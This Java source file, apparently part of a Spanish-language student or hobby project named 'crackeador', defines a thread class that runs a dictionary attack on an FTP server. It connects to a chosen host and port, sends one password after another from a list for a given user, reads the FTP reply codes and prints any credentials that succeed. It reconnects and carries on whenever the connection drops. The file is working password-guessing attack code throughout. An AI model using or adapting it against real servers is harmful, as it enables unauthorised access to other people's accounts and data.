package crackeador;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.SocketException;
import java.util.ArrayList;

public class HebraCrack extends Thread{

	private CrackDiccionario cd;
	private String usuario;
	private ArrayList<String> passwords;
	private BufferedReader fEnt;
	private PrintWriter fSal;
	private Socket servidor;
	private int pos;

	public HebraCrack(CrackDiccionario cd, String usuario, ArrayList<String> passwords){
		this.cd = cd;
		this.passwords = passwords;
		this.usuario = usuario;
		pos = 0;
		try{
			servidor = new Socket(cd.getHost(), cd.getPuerto());
			fEnt = new BufferedReader(new InputStreamReader(servidor.getInputStream()));
			fSal = new PrintWriter(servidor.getOutputStream(), true);
		} catch (IOException ioe){
			ioe.printStackTrace();
		}
	}

	public void run(){
		boolean encontrado = false;
		try{
			for(int i = pos; i < passwords.size() && !encontrado; i++){
				fSal.println("user "+usuario);
				String linea = fEnt.readLine();
				while(linea.contains("220") || linea.contains("331")){
					if(linea.contains("331"))
						fSal.println("pass "+passwords.get(i));
					linea = fEnt.readLine();
				}
				if(linea.contains("530")){
					System.out.println("Pass incorrecta");
				}
				if(linea.contains("230")){
					System.out.println("Contraseña correcta -> User:"+usuario+" - Pass: "+passwords.get(i));
					encontrado = true;
				}
				pos++;
			}
			if(Thread.activeCount() == 2){
				System.out.println("Tiempo de ejecución total: "+(System.currentTimeMillis()-CrackDiccionario.tiempo));
			}
			fSal.close();
			fEnt.close();
			servidor.close();
		} catch(NullPointerException npe){
			iniciaConexion();
		} catch(SocketException se){
			iniciaConexion();
		} catch (IOException ioe){
			ioe.printStackTrace();
		}
	}

	public void iniciaConexion(){
		try {
			servidor.close();
			servidor = new Socket(cd.getHost(), cd.getPuerto());
			fEnt = new BufferedReader(new InputStreamReader(servidor.getInputStream()));
			fSal = new PrintWriter(servidor.getOutputStream(), true);
			run();
		} catch (IOException e) {
			e.printStackTrace();
		}

	}

}
